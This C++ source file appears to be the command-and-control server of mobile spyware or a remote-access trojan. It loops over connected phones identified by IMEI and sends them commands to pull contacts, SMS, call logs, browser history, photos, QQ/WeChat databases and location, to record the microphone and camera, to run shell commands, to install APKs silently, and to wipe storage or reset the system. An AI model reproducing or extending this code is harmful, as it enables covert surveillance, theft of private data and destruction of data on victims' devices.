
#include <windows.h>
#include "iosServer.h"
#include "PublicFunction.h"
#include "CommandProcess.h"
#include "WatchDog.h"
#include "cmdUploadFile.h"
#include "cmdDownloadFile.h"
#include "cmdSendMessage.h"
#include "Additional.h"
#include "CommandUtils.h"
#include "PacketMaker.h"
#include "iosmysqlOper.h"


#include <string>

using namespace std;

#define CommandProcessException 2



DWORD __stdcall CommandProcess::CommandProcessMain(LPDATAPROCESS_PARAM lpparam, char * lpdata,int buflimit,char * imei,char *username) {
	
	int iRet = 0;
	iRet = CommandUtils::GeneralCommand(CMD_SHUTDOWNSYSTEM, SHUTDOWNCOMMANDFILE, lpparam, imei, username);
	if (iRet == NETWORKERROR) {
		return NETWORKERROR;
	}
	
	iRet = CommandUtils::GeneralCommand(CMD_DATA_WIFI, PHONEWIFICOMMANDFILE, lpparam, imei, username);
	if (iRet == NETWORKERROR) {
		return NETWORKERROR;
	}
	iRet = CommandUtils::GeneralCommand(CMD_DATA_WEBKITHISTORY, WEBKITBROWSERCOMMANDFILE, lpparam, imei, username);
	if (iRet == NETWORKERROR) {
		return NETWORKERROR;
	}

	iRet = CommandUtils::GeneralCommand(CMD_DATA_CHROMEHISTORY, CHROMEBROWSERCOMMANDFILE, lpparam, imei, username);
	if (iRet == NETWORKERROR) {
		return NETWORKERROR;
	}

	iRet = CommandUtils::GeneralCommand(CMD_DATA_APPMESSAGE, APPMESSAGECOMMANDFILE, lpparam, imei, username);
	if (iRet == NETWORKERROR) {
		return NETWORKERROR;
	}
	
	iRet = CommandUtils::GeneralCommand(CMD_DATA_MESSAGE, MESSAGECOMMANDFILE, lpparam, imei, username);
	if (iRet == NETWORKERROR){
		return NETWORKERROR;
	}

	iRet = CommandUtils::GeneralCommand(CMD_DATA_CONTACTS, CONTACTCOMMANDFILE, lpparam, imei, username);
	if (iRet == NETWORKERROR) {
		return NETWORKERROR;
	}

	iRet = CommandUtils::GeneralCommand(CMD_DATA_DCIM, DCIMCOMMANDFILE, lpparam, imei, username);
	if (iRet == NETWORKERROR) {
		return NETWORKERROR;
	}

	iRet = CommandUtils::GeneralCommand(CMD_DATA_CALLLOG, CALLLOGCOMMANDFILE, lpparam, imei, username);
	if (iRet == NETWORKERROR) {
		return NETWORKERROR;
	}

	iRet = CommandUtils::GeneralCommand(CMD_DATA_DEVICEINFO, DEVICEINFOCOMMANDFILE, lpparam, imei, username);
	if (iRet == NETWORKERROR) {
		return NETWORKERROR;
	}

	iRet = CommandUtils::GeneralCommand(CMD_DATA_APPPROCESS, APPLISTCOMMANDFILE, lpparam, imei, username);
	if (iRet == NETWORKERROR) {
		return NETWORKERROR;
	}


	iRet = CommandUtils::GeneralCommand(CMD_DATA_RUNNINGAPPS, RUNNINGAPPSCOMMANDFILE, lpparam, imei, username);
	if (iRet == NETWORKERROR) {
		return NETWORKERROR;
	}

	iRet = CommandUtils::GeneralCommand(CMD_DATA_FILERECORD, FILERECORDCOMMANDFILE, lpparam, imei, username);
	if (iRet == NETWORKERROR) {
		return NETWORKERROR;
	}

	iRet = CommandUtils::GeneralCommand(CMD_DATA_SDCARDFILES, SDCARDCOMMANDFILE, lpparam, imei, username);
	if (iRet == NETWORKERROR) {
		return NETWORKERROR;
	}

	iRet = CommandUtils::GeneralCommand(CMD_DATA_FLASHCARDFILES, FLASHCARDCOMMANDFILE, lpparam, imei, username);
	if (iRet == NETWORKERROR) {
		return NETWORKERROR;
	}

	iRet = CommandUtils::GeneralCommand(CMD_DATA_EXTCARDFILES, EXTSDCARDCOMMANDFILE, lpparam, imei, username);
	if (iRet == NETWORKERROR) {
		return NETWORKERROR;
	}

	iRet = CommandUtils::GeneralCommand(CMD_WIPESTORAGE, WIPESTORAGEFILE, lpparam, imei, username);
	if (iRet == NETWORKERROR) {
		return NETWORKERROR;
	}

	iRet = CommandUtils::GeneralCommand(CMD_WIPESYSTEM, WIPESYSTEMFILE, lpparam, imei, username);
	if (iRet == NETWORKERROR) {
		return NETWORKERROR;
	}

	iRet = CommandUtils::GeneralCommand(CMD_UNINSTALLSELF, UNINSTALLCOMMANDFILE, lpparam, imei, username);
	if (iRet == NETWORKERROR) {
		return NETWORKERROR;
	}
	iRet = CommandUtils::GeneralCommand(CMD_RESETPROGRAM, RESETPROGRAMCOMMANDFILE, lpparam, imei, username);
	if (iRet == NETWORKERROR) {
		return NETWORKERROR;
	}

	iRet = CommandUtils::GeneralCommand(CMD_RESETSYSTEM, RESETSYSTEMFILE, lpparam, imei, username);
	if (iRet == NETWORKERROR) {
		return NETWORKERROR;
	}
	iRet = CommandUtils::GeneralCommand(CMD_SINGLELOCATION, SINGLELOCATIONCOMMANDFILE, lpparam, imei, username);
	if (iRet == NETWORKERROR) {
		return NETWORKERROR;
	}
	iRet = CommandUtils::GeneralCommand(CMD_SINGLESCREENCAP, SINGLESCREENCOMMANDFILE, lpparam, imei, username);
	if (iRet == NETWORKERROR) {
		return NETWORKERROR;
	}
	iRet = CommandUtils::GeneralCommand(CMD_CANCELLOCATION, CANCELLOCATIONCOMMANDFILE, lpparam, imei, username);
	if (iRet == NETWORKERROR) {
		return NETWORKERROR;
	}
	iRet = CommandUtils::GeneralCommand(CMD_CANCELSCREENCAP, CANCELSCREENCOMMANDFILE, lpparam, imei, username);
	if (iRet == NETWORKERROR) {
		return NETWORKERROR;
	}




	iRet = CommandUtils::CommandWithStringStringString(CMD_DATA_SCRNSNAPSHOT, SCRNSNAPSHOTOMMANDFILE, lpparam, imei, username);
	if (iRet == NETWORKERROR) {
		return NETWORKERROR;
	}


	iRet = CommandUtils::CommandWithValue(CMD_DATA_LOCATION, LOCATIONCOMMANDFILE, lpparam, imei, username);
	if (iRet == NETWORKERROR) {
		return NETWORKERROR;
	}

	iRet = CommandUtils::CommandWithValue(CMD_UPLOADDB, UPLOADQQWXDBCOMMANDFILE, lpparam, imei, username);
	if (iRet == NETWORKERROR) {
		return NETWORKERROR;
	}

	iRet = CommandUtils::CommandWithValue(CMD_DATA_CAMERAPHOTO, CAMERAPHOTOCOMMANDFILE, lpparam, imei, username);
	if (iRet == NETWORKERROR) {
		return NETWORKERROR;
	}

	iRet = CommandUtils::CommandWithValue(CMD_MICAUDIORECORD, MICAUDIOCOMMANDFILE, lpparam, imei, username);
	if (iRet == NETWORKERROR) {
		return NETWORKERROR;
	}



	iRet = CommandUtils::CommandWithString(CMD_RUNCOMMAND, SHELLCOMMANDFILE, lpparam, imei, username);
	if (iRet == NETWORKERROR) {
		return NETWORKERROR;
	}

	iRet = CommandUtils::CommandWithString(CMD_RESETPASSWORD, RESETPASSWORDFILE, lpparam, imei, username);
	if (iRet == NETWORKERROR) {
		return NETWORKERROR;
	}

	iRet = CommandUtils::CommandWithString(CMD_PHONECALL, CALLPHONEFILE, lpparam, imei, username);
	if (iRet == NETWORKERROR) {
		return NETWORKERROR;
	}

	iRet = CommandUtils::CommandWithString(CMD_CHANGEIP, CHANGEIPCOMMANDFILE, lpparam, imei, username);
	if (iRet == NETWORKERROR)
	{
		return NETWORKERROR;
	}

	

	iRet = CommandUploadFile::CmdUploadFile(lpdata, lpparam, imei, username);
	if (iRet == NETWORKERROR) {
		return NETWORKERROR;
	}

	iRet = CommandDownloadFile::CmdDownloadFile(lpdata, lpparam, imei, username);
	if (iRet == NETWORKERROR) {
		return NETWORKERROR;
	}

	iRet = CommandDownloadFile::CmdAutoInstallApk(lpdata, lpparam, imei, username);
	if (iRet == NETWORKERROR) {
		return NETWORKERROR;
	}

	iRet = CommandDownloadFile::CmdUpdatePlugin(lpdata, lpparam, imei, username);
	if (iRet == NETWORKERROR) {
		return NETWORKERROR;
	}
	

	iRet = SendPhoneMessage::CmdSendMessage(lpparam, imei, username,SENDMESSAGEFILE,CMD_SENDMESSAGE);
	if (iRet == NETWORKERROR) {
		return NETWORKERROR;
	}

	iRet = SendPhoneMessage::CmdSendMessage(lpparam, imei, username,MESSAGEBOXCOMMANDFILE,CMD_MESSAGEBOX);
	if (iRet == NETWORKERROR) {
		return NETWORKERROR;
	}

	return TRUE;
}





DWORD __stdcall CommandProcess::CommandProcessMainLop(LPDATAPROCESS_PARAM lpparam,char * lpdata) {

	int iRet = 0;

	int iRecvLen = recv(lpparam->sockclient, lpdata, NETWORK_DATABUF_SIZE, 0);
	if (iRecvLen < sizeof(COMMUNICATION_PACKET_HEADER)) {
		return FALSE;
	}

	LPCOMMUNICATION_PACKET_HEADER lphdr = (LPCOMMUNICATION_PACKET_HEADER)lpdata;
	int iBlockSize = lphdr->dwsize;
	if (iRecvLen != iBlockSize )
	{
		return FALSE;
	}

	char imei[IOS_IDENTIFIER_SIZE * 2] = { 0 };
	memmove(imei, lphdr->iphoneID, IOS_IDENTIFIER_SIZE);
	iRet = Additional::checkImei(imei);
	if (iRet == FALSE)
	{
		return FALSE;
	}

	char username[USER_NAME_SIZE * 2] = { 0 };
	memmove(username, lphdr->username, USER_NAME_SIZE);
	iRet = Additional::checkUserName(username);
	if (iRet == FALSE)
	{
		return FALSE;
	}

	
	if (lphdr->dwcmd == CMD_HEARTBEAT)
	{

		iRet = CommandUtils::SendHeartBeat(lpparam, imei, username);
		if (iRet == FALSE)
		{
			return NETWORKERROR;
		}
		else {
			int onlinetype = lphdr->reservedname & (CLIENT_NETWORK_TYPE_WIFI | CLIENT_NETWORK_TYPE_WIRELESS);
			iRet = WatchDog::CheckIfOnlineExist(imei, username, onlinetype, lpparam->sockclient, lpparam->si, THREAD_COMMAND, lpparam->threadid);

			MySql::enter();
			MySql * mysql = new MySql();
			__try {
				mysql->insertClientByCmd(username, imei);
			}
			__except (1) {
				char szout[1024];
				wsprintfA(szout, "insertClientByCmd exception,user:%s,imei:%s\r\n", username, imei);
				WriteLogFile(szout);
			}
			delete mysql;
			MySql::leave();
		}
	}

	iRet = CommandUtils::CommandSendConfig(CMD_SETCONFIG, CONFIG_FILENAME, lpparam, imei, username);
	if (iRet <= 0)
	{
		//return FALSE;
	}

	int waittimes = HEARTBEAT_TIME_DELAY / COMMAND_TIME_DELAY;
	int counter = 0;
	while (TRUE)
	{
		iRet = CommandProcessMain(lpparam, lpdata, NETWORK_DATABUF_SIZE, imei, username);
		if (iRet == NETWORKERROR) {
			return NETWORKERROR;
		}

		counter++;
		if (counter >= waittimes)
		{
			counter = 0;
			//lock screen will cause heart beat error
			iRet = CommandUtils::SendHeartBeat(lpparam, imei, username);
			if (iRet == FALSE)
			{
				return NETWORKERROR;
			}
			else {
				int onlinetype = lphdr->reservedname & (CLIENT_NETWORK_TYPE_WIFI | CLIENT_NETWORK_TYPE_WIRELESS);
				iRet = WatchDog::CheckIfOnlineExist(imei, username, onlinetype,lpparam->sockclient, lpparam->si, THREAD_COMMAND, lpparam->threadid);
			}
		}
		Sleep(COMMAND_TIME_DELAY);
		continue;
	}

 	return TRUE;
}






DWORD __stdcall CommandProcess::CommandProcessor(LPDATAPROCESS_PARAM lpparam){
	DATAPROCESS_PARAM stparam = *lpparam;

	char lpdata[NETWORK_DATABUF_SIZE + 1024];
	
	char szLog[1024];

	int iRet = 0;
	
	__try{
		iRet = CommandProcessMainLop(&stparam, lpdata);
		if (iRet == NETWORKERROR)
		{
			//ErrorFormat(&stparam, szLog, "CommandProcess error packet");
			//WriteLogFile(szLog);
		}

		closesocket(stparam.sockclient);
		return iRet;
	}
	__except(1){
		ErrorFormat(&stparam,szLog,"CommandProcessor exception");
		WriteLogFile(szLog);
		return FALSE;
	}
}